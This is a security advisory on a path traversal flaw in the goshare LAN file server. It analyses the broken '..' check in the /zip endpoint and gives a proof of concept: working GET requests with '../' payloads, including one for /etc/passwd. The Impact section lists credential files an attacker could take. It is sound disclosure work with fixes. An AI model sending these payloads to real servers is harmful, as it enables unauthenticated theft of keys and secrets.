# VDR-014: Unauthenticated Path Traversal (arbitrary file read) in goshare

- **Target**: [wizsk/goshare](https://github.com/wizsk/goshare)
- **Severity**: High (CVSS 3.1: 7.5)
- **CWE**: [CWE-22](https://cwe.mitre.org/data/definitions/22.html) - Path Traversal
- **CVE**: [CVE-2026-51098](https://www.cve.org/CVERecord?id=CVE-2026-51098)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Discovered**: 2026-06-05
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`goshare` is a LAN file-sharing server written in Go. Its default invocation runs
with **no password** (`-p` flag, documented as "default is no password"), so every
endpoint is reachable **unauthenticated**: the `auth()` wrapper short-circuits when
the configured password is the empty string.

The `/zip` endpoint accepts a caller-supplied list of `files` (and a `cwd`) and
joins each entry onto the configured share root before reading it into a zip
archive that is then served via `/downzip/<name>.zip`. The single defensive check
intended to stop directory traversal is logically broken: it only rejects a path
when that path simultaneously starts with `../`, **ends** with `/..`, and contains
no embedded `/../`. A normal traversal payload such as `../../../../etc/passwd`
does not end with `/..`, so the guard's first conjunct is false and the entire
check is skipped. The unsanitised, `..`-laden path then reaches `filepath.Join`
and `os.Open`, letting an unauthenticated network client read **arbitrary files
outside the shared directory** and download them as a zip.

This affects the current `HEAD` (commit `37a755d`, 2026-02-07) and is present
**through tag `v4.4`**.

When a password *is* configured the same traversal still works for any
authenticated LAN user, escaping the chosen share directory (still CWE-22, CVSS
6.5, `PR:L`).

## Affected Component

- `zip.go:162` - flawed traversal guard (the only `..` check); its boolean logic
  fails open for real traversal payloads.
- `zip.go:166` - `res = append(res, filepath.Join(cwd, v))` joins the uncontained,
  attacker-controlled `v` onto the share root.
- `zip.go:222` - `os.Open(f)` reads each resolved (out-of-root) path into the
  served zip archive (`zipDirs` / `walkDirTree`).
- `auth.go:13` - `if password != ""`; authentication is skipped entirely when no
  password is configured (the default).

## Details

### Default configuration is unauthenticated (`auth.go:13`)

```go
func auth(w http.ResponseWriter, r *http.Request, handler func(http.ResponseWriter, *http.Request)) {
    if password != "" {                         // <-- default password is ""
        if err := cookie.ReadCookie(r, cookie.CookieName); err != nil {
            http.Redirect(w, r, "/auth", http.StatusMovedPermanently)
            return
        }
    }
    handler(w, r)                                // reached directly when password == ""
}
```

`password` defaults to `""` (`main.go:61`, `flag.StringVar(&password, "p", "", ...)`;
help text: "password (default is no password)"). With the default, every
`auth*` handler - including `authZip` -> `s.zip` - runs without any credential.
The server listens on all interfaces (`net.Listen("tcp", "0.0.0.0:"+p)`,
`utils.go:20`; `http.ListenAndServe(":"+p, ...)`, `main.go:160`), so it is reachable
across the LAN (`AV:N`).

### The broken `..` guard (`zip.go:162`)

```go
// NOTE: I don't know if it's a possibility for abbitray data access. so just incase.
if strings.HasSuffix(v, "/..") && strings.HasPrefix(v, "../") && !strings.Contains(v, "/../") {
    http.Error(w, "Bad actor '..'", http.StatusBadRequest)
    return
}
res = append(res, filepath.Join(cwd, v))        // zip.go:166 - v still contains ../
```

The block executes only if **all three** conditions hold. For the payload
`../../../../etc/passwd`:

- `strings.HasSuffix(v, "/..")` -> the string ends with `passwd`, **not** `/..` -> **false**.

Because the first conjunct is false, `&&` short-circuits and the guard is skipped.
The only string shape that actually trips the guard is the pathological
`../something/..` (starts with `../`, ends with `/..`, no embedded `/../`) - which
is not a useful exfiltration payload. In effect the guard is dead code for every
real traversal, and `v` flows uncontained into `filepath.Join(cwd, v)`.

`filepath.Join` resolves the `..` segments lexically, so the join escapes above
the share root:

```
filepath.Join("<share-root>", "../../../../etc/passwd")  ==  /etc/passwd
```

### Source -> sink

The SSE frontend (`frontend/src/zip.js:84-85`) issues, via `EventSource` (an HTTP
**GET**):

```
/zip?files=<urlencoded path>&cwd=<urlencoded current dir>
```

Server-side (`zip.go:100-167`):

1. `cwd := strings.TrimPrefix(r.FormValue("cwd"), "/browse")`, then
   `cwd = filepath.Join(s.root, cwd, "/")`.
2. For each `v` in `r.Form["files"]`: URL-unescape, `strings.TrimPrefix(v, "/browse/")`,
   run the broken guard, then `filepath.Join(cwd, v)`.
3. `zipDirs(...)` walks each resolved path and `os.Open`s every file into the zip.
4. The zip name is registered in an in-memory cache and returned as
   `/downzip/<name>.zip`; `downZip` (`zip.go:71-80`) `http.ServeFile`s it back.

Because Go's `r.Form`/`r.FormValue` parse the URL query for any method, the attack
works with the frontend's native GET as well as with POST. The `files` parameter
is fully attacker-controlled; the `cwd` prefix is the configured share root.

## Proof of Concept

Reproduced end-to-end against a fresh build of commit `37a755d` (tag `v4.4`,
go1.26), started **unauthenticated** on port 18804:

```
goshare -d <share>/outside/share --port 18804 --http --noqr      # NO -p => no password
```

Sentinels were placed **above** the share root:

```
sandbox/DEEP_SECRET.txt              (2 levels above share root)  marker GOSHARE-DEEP-SECRET
sandbox/outside/SECRET_OUT.txt       (1 level  above share root)  marker GOSHARE-SECRET-OUTSIDE
sandbox/outside/share/               <- the shared directory (server -d target)
```

**Request (1 level above the share root), exactly as the SSE client sends it (GET):**

```
GET /zip?cwd=%2Fbrowse%2F&files=..%2FSECRET_OUT.txt
```

**SSE response:**

```
event: onProgress
data: {"status": 0}

event: done
data: {"name": "SECRET_OUT.txt.zip", "url": "/downzip/SECRET_OUT.txt.zip"}
```

**Exfiltration:**

```
GET /downzip/SECRET_OUT.txt.zip      ->  ZIP archive
```

**Verified zip contents (read with Go's `archive/zip`):**

```
entry: "L:\Dennis\...\poc\sandbox\outside\SECRET_OUT.txt"   (130 bytes)   [ONE level above share root]
content:
    GOSHARE-SECRET-OUTSIDE
    this file lives ONE level ABOVE the shared folder and must NOT be reachable.
    sentinel-token-2026-06-05-AAA
```

**Depth confirmation - 2 levels up** (`files=../../DEEP_SECRET.txt`) produced
`DEEP_SECRET.txt.zip` containing `...\poc\sandbox\DEEP_SECRET.txt` (marker
`GOSHARE-DEEP-SECRET`). A further payload reading a file at the **filesystem/drive
root** (9+ levels up) likewise succeeded, confirming the join escapes all the way
to the root of the filesystem.

For contrast, the in-share baseline (`files=public_hello.txt`) zipped
`...\outside\share\public_hello.txt` - the only file that *should* be reachable.

On a Linux host (goshare's primary platform), `files=../../../../../../../../etc/passwd`
reads `/etc/passwd` directly. On the Windows test host that exact path resolves to
a non-existent `\etc\passwd`, so the server emits `event: errror` (an `os.Open`
failure *after* the guard already passed - **not** a guard rejection, which would
be HTTP 400 "Bad actor '..'"); the drive-root read above demonstrates the
equivalent out-of-tree read on this host.

Full captured output (all SSE streams, zip listings, extracted content, and the
server request log showing no guard blocks) is in [`poc/OUTPUT.txt`](poc/OUTPUT.txt).
Reproduction scripts: [`poc/run_poc.sh`](poc/run_poc.sh) (Linux/macOS) and
[`poc/run_poc.ps1`](poc/run_poc.ps1) (Windows).

## Impact

An unauthenticated attacker on the same network (the default deployment model) can
read **any file the goshare process can access**, well outside the directory the
operator chose to share. Realistic targets include `/etc/passwd`, SSH private keys
(`~/.ssh/id_*`), shell history, cloud-credential files (`~/.aws/credentials`),
application config and secrets, and `.env` files. Because goshare is marketed for
quick ad-hoc sharing and is frequently launched from a user's home or a project
directory, sensitive files commonly sit only one or two directories above the
share root. The read content is returned as a downloadable zip, making bulk
exfiltration trivial (entire directory trees can be requested at once). The flaw
is transport-independent (present over the default HTTPS as well as plain HTTP).

## Recommendation

- **Canonicalize and contain the join.** After `filepath.Join(cwd, v)`, resolve the
  result (e.g. `filepath.Abs` / `filepath.Clean`, and ideally
  `filepath.EvalSymlinks`) and reject any path that is not strictly within the
  share root - for example verify `strings.HasPrefix(cleaned, root+string(os.PathSeparator))`
  (or use Go 1.24+ `os.Root` / `root.Open` to make traversal impossible by
  construction). Replace the current `HasSuffix/HasPrefix/Contains` heuristic
  entirely; it cannot be salvaged.
- Apply the same containment to `cwd` and to the upload/mkdir handlers, not just
  `/zip`.
- **Require authentication by default**, or at minimum refuse to bind to non-loopback
  interfaces when no password is set, so an accidental no-password launch is not
  silently exposed to the whole LAN.

## Status

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during source code audit |
| 2026-06-05 | Working PoC confirmed |
| TBD | CVE request submitted to MITRE CNA-LR |

## References

- [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
- [Upstream repository](https://github.com/wizsk/goshare)
